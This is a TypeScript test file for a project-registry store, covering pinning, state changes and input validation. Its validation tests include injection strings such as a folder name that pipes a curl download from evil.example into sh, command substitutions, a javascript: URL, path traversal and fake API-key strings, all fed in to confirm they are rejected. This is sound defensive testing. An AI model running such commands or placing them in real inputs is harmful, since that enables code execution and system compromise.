import { test } from 'node:test';
import assert from 'node:assert/strict';
import { openDb } from '../db.js';
import { ProjectStore } from './store.js';
import { MAX_PINNED, ProjectError } from './types.js';

const setup = () => {
  const db = openDb(':memory:');
  let t = Date.parse('2026-11-03T10:00:00Z');
  const registry = new ProjectStore(db, () => new Date(t));
  return { db, registry, tick: (ms: number) => { t += ms; } };
};
const code = (c: ProjectError['code']) => (e: unknown) => e instanceof ProjectError && e.code === c;

test('setState records when and by whom, and unpins a project that leaves open', () => {
  const { registry, tick } = setup();
  registry.create('wildlog', { state: 'open' }, 'migration');
  registry.pin('wildlog', 'owner');
  tick(60_000);
  const p = registry.setState('wildlog', 'parked', 'owner');
  assert.equal(p.state, 'parked');
  assert.equal(p.stateChangedAt, '2026-11-03T10:01:00.000Z');
  assert.equal(p.updatedBy, 'owner');
  assert.equal(p.pinnedAt, null);
});

test('pin refuses a seventh project with "On the go holds 6 projects: unpin one first" and changes nothing', () => {
  const { registry } = setup();
  for (let i = 0; i < MAX_PINNED + 1; i++) registry.create(`p${i}`, { state: 'open' }, 'owner');
  for (let i = 0; i < MAX_PINNED; i++) registry.pin(`p${i}`, 'owner');
  assert.throws(() => registry.pin(`p${MAX_PINNED}`, 'owner'), (e: unknown) => code('pin_limit')(e) && /On the go holds 6 projects: unpin one first/.test((e as Error).message));
  assert.equal(registry.get(`p${MAX_PINNED}`)!.pinnedAt, null);
  assert.equal(registry.list().filter((p) => p.pinnedAt !== null).length, MAX_PINNED);
});

test('pin refuses a project that is not open', () => {
  const { registry } = setup();
  registry.create('idea1', { state: 'idea' }, 'owner');
  assert.throws(() => registry.pin('idea1', 'owner'), code('invalid'));
});

test('setInfo validates the one-liner, area, url and folder', () => {
  const { registry } = setup();
  registry.create('vpn', { state: 'open' }, 'owner');
  const ok = registry.setInfo('vpn', { oneLiner: 'Home VPN that works from the library', area: 'home', url: 'https://vpn.example', folder: 'vpn', remotes: ['minipc'] }, 'Claude Code');
  assert.deepEqual([ok.oneLiner, ok.area, ok.url, ok.folder, ok.remotes, ok.updatedBy], ['Home VPN that works from the library', 'home', 'https://vpn.example', 'vpn', ['minipc'], 'Claude Code']);
  assert.throws(() => registry.setInfo('vpn', { oneLiner: 'x'.repeat(141) }, 'owner'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { oneLiner: 'two\nlines' }, 'owner'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { area: 'garden' as any }, 'owner'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { url: 'javascript:alert(1)' }, 'owner'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { folder: '../etc' }, 'owner'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { folder: 'a/b' }, 'owner'), code('invalid'));
  assert.equal(registry.setInfo('vpn', { url: null, oneLiner: null }, 'owner').url, null);
});

test('create refuses an existing name', () => {
  const { registry } = setup();
  registry.create('aibrain', { state: 'idea', oneLiner: 'One brain' }, 'owner');
  assert.equal(registry.get('aibrain')!.oneLiner, 'One brain');
  assert.throws(() => registry.create('aibrain', { state: 'open' }, 'owner'), code('invalid'));
});

test('every method throws not_found for an unknown name', () => {
  const { registry } = setup();
  for (const f of [
    () => registry.setInfo('nope', {}, 'owner'), () => registry.setState('nope', 'open', 'owner'),
    () => registry.pin('nope', 'owner'), () => registry.unpin('nope', 'owner'), () => registry.snooze('nope', '2026-12-01T00:00:00.000Z', 'owner'),
  ]) assert.throws(f, code('not_found'));
  assert.equal(registry.get('nope'), undefined);
});

test('setInfo refuses folder names a shell would run as commands, and keeps real names with spaces', () => {
  const { registry } = setup();
  registry.create('pine-lodge', { state: 'open' }, 'owner');
  for (const bad of ['wildlog; curl -s evil.example | sh', 'a$(id)', 'a`id`', 'a|b', "it's", 'a&b', 'a>b', '-rf']) {
    assert.throws(() => registry.setInfo('pine-lodge', { folder: bad }, 'Claude'), code('invalid'), bad);
  }
  assert.equal(registry.setInfo('pine-lodge', { folder: 'Pine Lodge' }, 'owner').folder, 'Pine Lodge');
  assert.equal(registry.setInfo('pine-lodge', { folder: 'carpeta sin título' }, 'owner').folder, 'carpeta sin título');
});

test('setInfo refuses a secret in the one-liner or the URL', () => {
  const { registry } = setup();
  registry.create('vpn', { state: 'open' }, 'owner');
  assert.throws(() => registry.setInfo('vpn', { url: 'https://user:ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/x' }, 'Claude'), code('invalid'));
  assert.throws(() => registry.setInfo('vpn', { oneLiner: 'key sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789' }, 'Claude'), code('invalid'));
});

test('runs on is stored normalised and placesInUse lists each name once', () => {
  const { registry } = setup();
  registry.create('wildlog', { state: 'open' }, 'owner');
  registry.create('brainai', { state: 'open' }, 'owner');
  assert.deepEqual(registry.get('wildlog')!.runsOn, []);
  assert.deepEqual(registry.placesInUse(), []);
  assert.deepEqual(registry.setInfo('wildlog', { runsOn: ['minipc', 'PI'] }, 'owner').runsOn, ['minipc', 'pi']);
  registry.setInfo('brainai', { runsOn: 'pi' }, 'owner');
  assert.deepEqual(registry.placesInUse(), ['minipc', 'pi']);
  // Leaving runsOn out keeps it.
  assert.deepEqual(registry.setInfo('wildlog', { oneLiner: 'Wine cellar' }, 'owner').runsOn, ['minipc', 'pi']);
});

test('a place that looks like a secret is refused', () => {
  const { registry } = setup();
  registry.create('wildlog', { state: 'open' }, 'owner');
  assert.throws(() => registry.setInfo('wildlog', { runsOn: ['sk-abcdefghij0123456789'] }, 'owner'), /looks like it contains a secret/);
  assert.deepEqual(registry.get('wildlog')!.runsOn, []);
});
